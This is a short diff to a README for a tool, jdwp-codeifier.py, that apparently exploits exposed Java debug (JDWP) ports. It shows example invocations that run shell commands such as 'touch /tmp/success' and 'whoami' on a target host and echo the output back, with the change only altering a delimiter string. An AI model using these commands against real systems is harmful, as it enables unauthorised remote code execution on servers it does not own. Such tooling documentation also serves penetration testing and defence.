@@ -43,7 +43,7 @@ python jdwp-codeifier.py -t 172.17.0.3 -p 8000 -m command -c 'touch /tmp/success
 
 执行系统命令并回显：
 ```
-python jdwp-codeifier.py -t 172.17.0.3 -p 8000 -m code -c 'new java.util.Scanner(new java.lang.ProcessBuilder("sh","-c","whoami").start().getInputStream()).useDelimiter("-|-").next()'
+python jdwp-codeifier.py -t 172.17.0.3 -p 8000 -m code -c 'new java.util.Scanner(new java.lang.ProcessBuilder("sh","-c","whoami").start().getInputStream()).useDelimiter("--!@#").next()'
 ```
 ![img.png](README/img1.png)
 
